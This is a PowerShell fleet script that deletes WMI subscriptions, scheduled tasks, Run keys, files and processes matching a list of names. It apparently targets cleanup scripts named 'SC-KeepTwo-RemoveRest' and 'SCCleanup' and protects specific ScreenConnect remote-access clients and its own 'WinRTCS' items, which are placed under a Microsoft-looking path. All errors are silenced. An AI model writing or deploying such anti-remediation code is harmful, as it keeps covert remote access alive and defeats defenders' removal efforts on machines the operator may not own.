# WINRTCS fleet_purge.ps1 — remove C12 WMI ghosts + SC-KeepTwo-RemoveRest (gist) artifacts
# NEVER touches Gryxa 36e506ff or sevrz keepers 5f601057 / f861c814.
# Report: C:\Users\Public\fleet_purge_report.txt + .done
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$report = 'C:\Users\Public\fleet_purge_report.txt'
$done = 'C:\Users\Public\fleet_purge.done'
$lines = New-Object System.Collections.Generic.List[string]
function L([string]$s) { [void]$lines.Add($s) }

L ("=== FLEET_PURGE " + (Get-Date -Format o) + " host=" + $env:COMPUTERNAME + " ===")

$ns = 'root\subscription'
# C12/EVITA WMI + gist cleanup markers
$wmiPat = 'SCWatchdog|SystemHealthMonitor|BVTConsumer|BVTTrigger|BVTFilter|WucacheWatchdog|KernCap|ETLParser|NetTraceParser|wucache|etlcache|own_mon|own_gryxa|SCCleanup|KeepTwo|RemoveRest|3d23696c4a9e2141'
$badExact = @(
    'SCWatchdog_Consumer', 'SCWatchdog_ServiceDelete', 'SCWatchdog_ServiceStop',
    'SystemHealthMonitor_Consumer', 'SystemHealthMonitor_Filter',
    'BVTConsumer', 'BVTTriggerFilter',
    'WucacheWatchdogC', 'WucacheWatchdogF'
)

$found = 0
$killed = 0

# --- inventory WMI before kill ---
L '=== WMI_BEFORE ==='
foreach ($b in @(Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding)) {
    $blob = [string]$b.Filter + ' -> ' + [string]$b.Consumer
    if ($blob -match $wmiPat) { L ("HIT_BIND " + $blob); $found++ }
}
foreach ($c in @(Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer)) {
    $blob = [string]$c.Name + ' ' + [string]$c.CommandLineTemplate
    if (($badExact -contains $c.Name) -or ($blob -match $wmiPat)) {
        L ("HIT_CONS " + $c.Name + " cmd=" + (($c.CommandLineTemplate -replace '\s+', ' ').Substring(0, [Math]::Min(160, ($c.CommandLineTemplate -replace '\s+', ' ').Length))))
        $found++
    }
}
foreach ($f in @(Get-WmiObject -Namespace $ns -Class __EventFilter)) {
    $blob = [string]$f.Name + ' ' + [string]$f.Query
    if (($badExact -contains $f.Name) -or ($blob -match $wmiPat)) {
        L ("HIT_FILT " + $f.Name)
        $found++
    }
}

# --- kill WMI (bindings first, WMI.Delete loop) ---
for ($round = 1; $round -le 5; $round++) {
    $n = 0
    foreach ($b in @(Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding)) {
        $blob = [string]$b.Filter + ' ' + [string]$b.Consumer
        if ($blob -match $wmiPat) {
            try { $b.Delete(); L ("DEL_BIND " + $blob); $n++; $killed++ } catch { L ("FAIL_BIND " + $_.Exception.Message) }
        }
    }
    foreach ($cls in @('CommandLineEventConsumer', 'ActiveScriptEventConsumer', '__EventFilter', '__IntervalTimerInstruction')) {
        foreach ($it in @(Get-WmiObject -Namespace $ns -Class $cls)) {
            $blob = ''
            try { $blob = [string]$it.Name } catch {}
            try { if (-not $blob) { $blob = [string]$it.TimerId } } catch {}
            try { $blob = $blob + ' ' + [string]$it.Query } catch {}
            try { $blob = $blob + ' ' + [string]$it.CommandLineTemplate } catch {}
            if (($badExact -contains $it.Name) -or ($blob -match $wmiPat)) {
                try { $it.Delete(); L ("DEL_$cls " + $blob); $n++; $killed++ } catch { L ("FAIL_$cls " + $_.Exception.Message) }
            }
        }
    }
    if ($n -eq 0) { break }
}

# --- SCCleanup / KeepTwo gist artifacts ---
L '=== SCCLEANUP_GIST ==='
$cleanupPaths = @(
    'C:\ProgramData\SCCleanup',
    'C:\Users\Public\SCCleanup',
    'C:\Windows\Temp\SCCleanup',
    'C:\Users\Public\SC-KeepTwo-RemoveRest.ps1',
    'C:\Windows\Temp\SC-KeepTwo-RemoveRest.ps1',
    'C:\ProgramData\SCCleanup\SC-KeepTwo-RemoveRest.ps1'
)
foreach ($p in $cleanupPaths) {
    if (Test-Path -LiteralPath $p) {
        L ("HIT_PATH " + $p)
        $found++
        try {
            Remove-Item -LiteralPath $p -Recurse -Force
            L ("DEL_PATH " + $p)
            $killed++
        } catch { L ("FAIL_PATH " + $_.Exception.Message) }
    }
}
# sweep drop locations for KeepTwo / gist cleanup scripts (shallow)
foreach ($root in @('C:\Users\Public', 'C:\Windows\Temp', 'C:\ProgramData\SCCleanup')) {
    if (-not (Test-Path -LiteralPath $root)) { continue }
    Get-ChildItem -LiteralPath $root -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.FullName -notmatch 'WinRTCS|winrtcs|fleet_purge' } |
        Where-Object {
            $_.Name -match 'KeepTwo|RemoveRest|SCCleanup|SC-Keep|gistfile' -or (
                $_.Extension -eq '.ps1' -and $_.Length -gt 200 -and $_.Length -lt 120000 -and
                (Select-String -LiteralPath $_.FullName -Pattern 'SC-KeepTwo-RemoveRest|KeeperList' -Quiet -ErrorAction SilentlyContinue)
            )
        } |
        Select-Object -First 40 |
        ForEach-Object {
            L ("HIT_SCRIPT " + $_.FullName)
            $found++
            try {
                Remove-Item -LiteralPath $_.FullName -Force
                L ("DEL_SCRIPT " + $_.FullName)
                $killed++
            } catch { L ("FAIL_SCRIPT " + $_.Exception.Message) }
        }
}
Get-ChildItem 'C:\ProgramData' -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match 'KeepTwo|RemoveRest|SCCleanup|SC-Keep|gistfile' } |
    ForEach-Object {
        L ("HIT_SCRIPT " + $_.FullName)
        $found++
        Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        L ("DEL_SCRIPT " + $_.FullName)
        $killed++
    }

# --- scheduled tasks referencing cleanup / keep-two / hostile keepers-only list ---
L '=== TASKS ==='
$taskPat = 'SCCleanup|KeepTwo|RemoveRest|SC-KeepTwo|3d23696c4a9e2141|gistfile|SC cleanup'
$raw = & schtasks.exe /Query /FO CSV /V 2>$null
if ($raw) {
    $csv = $raw | ConvertFrom-Csv
    foreach ($t in $csv) {
        $tn = [string]$t.TaskName
        if (-not $tn -or $tn -match '\\Microsoft\\Windows\\WinRTCS' -or $tn -match '\\WinRTCSSentinel') { continue }
        $acts = [string]$t.'Task To Run'
        if (-not $acts) { $acts = [string]$t.TaskToRun }
        if (($tn -match $taskPat) -or ($acts -match $taskPat)) {
            L ("HIT_TASK " + $tn + " :: " + (($acts -replace '\s+', ' ').Substring(0, [Math]::Min(180, ($acts -replace '\s+', ' ').Length))))
            $found++
            & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
            L ("DEL_TASK " + $tn)
            $killed++
        }
    }
}

# --- Run keys ---
L '=== RUNKEYS ==='
foreach ($rk in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
    )) {
    $p = Get-ItemProperty $rk -ErrorAction SilentlyContinue
    if (-not $p) { continue }
    foreach ($prop in $p.PSObject.Properties) {
        if ($prop.Name -match '^PS') { continue }
        if (($prop.Value -is [string]) -and ($prop.Value -match $taskPat -or $prop.Value -match $wmiPat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs|WinRTCS')) {
            L ("HIT_RUN " + $rk + " |" + $prop.Name + "=" + $prop.Value)
            $found++
            Remove-ItemProperty -Path $rk -Name $prop.Name -Force -ErrorAction SilentlyContinue
            L ("DEL_RUN " + $prop.Name)
            $killed++
        }
    }
}

# --- C12 ghost dirs/files ---
L '=== GHOST_PATHS ==='
foreach ($p in @(
        'C:\ProgramData\Microsoft\Diagnosis\ETLParser.ps1',
        'C:\ProgramData\Microsoft\NetTrace\NetTraceParser.ps1',
        'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\wucache.vbs',
        'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
        'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache',
        'C:\ProgramData\Microsoft\NetTrace',
        'C:\Windows\Temp\.wucache'
    )) {
    if (Test-Path -LiteralPath $p) {
        L ("HIT_GHOST " + $p)
        $found++
        Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue
        if (-not (Test-Path -LiteralPath $p)) { L ("DEL_GHOST " + $p); $killed++ } else { L ("FAIL_GHOST " + $p) }
    }
}

# --- kill running cleanup processes ---
Get-CimInstance Win32_Process | Where-Object {
    $_.CommandLine -and ($_.CommandLine -match 'SCCleanup|KeepTwo|RemoveRest|SC-KeepTwo') -and
    ($_.CommandLine -notmatch 'winrtcs|WinRTCS|fleet_purge')
} | ForEach-Object {
    L ("HIT_PROC " + $_.Name + " pid=" + $_.ProcessId)
    $found++
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    L ("DEL_PROC " + $_.ProcessId)
    $killed++
}

# --- post inventory ---
L '=== WMI_AFTER ==='
$left = 0
foreach ($b in @(Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding)) {
    $blob = [string]$b.Filter + ' -> ' + [string]$b.Consumer
    if ($blob -match $wmiPat) { L ("LEFT_BIND " + $blob); $left++ }
}
foreach ($c in @(Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer)) {
    if (($badExact -contains $c.Name) -or (([string]$c.Name + [string]$c.CommandLineTemplate) -match $wmiPat)) {
        L ("LEFT_CONS " + $c.Name); $left++
    }
}
if (Test-Path 'C:\ProgramData\SCCleanup') { L 'LEFT_PATH C:\ProgramData\SCCleanup'; $left++ }

# Gryxa presence check (report only)
$g = Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -ErrorAction SilentlyContinue
if ($g) { L ("GRYXA " + $g.Status) } else { L 'GRYXA MISSING' }

L ("=== SUMMARY found=$found killed=$killed left=$left ===")
$lines | Set-Content -Path $report -Encoding ASCII

# one-line status for quick pull
$status = if ($found -gt 0) { "DIRTY found=$found killed=$killed left=$left" } else { "CLEAN found=0 killed=0 left=0" }
Set-Content -Path $done -Value $status -Encoding ASCII
Set-Content -Path 'C:\ProgramData\WinRTCS\fleet_purge.status' -Value $status -Encoding ASCII
